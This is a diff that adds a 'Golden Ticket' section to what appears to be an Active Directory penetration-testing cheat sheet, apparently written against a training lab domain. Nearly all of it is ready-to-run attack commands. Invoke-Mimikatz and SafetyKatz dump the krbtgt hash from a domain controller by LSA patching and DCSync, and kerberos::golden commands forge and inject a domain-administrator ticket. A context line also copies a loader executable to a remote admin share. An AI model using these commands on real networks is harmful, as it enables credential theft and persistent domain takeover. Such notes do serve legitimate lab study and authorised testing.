@@ -1847,7 +1847,21 @@ copy executable file to another machine
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
+# Golden Ticket
 
-
-
-
+### Execute mimikatz on DC as DA to get krbtgt hash
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+```
+### use DCSync to get AES key for krbtgt account
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+# OR
+SafetyKatz.exe "lsadump::dcsync /user:dcrop\krbtgt" "exit"
+```
+### create a Golden ticket
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+# OR
+BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /aes256:<aes256> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
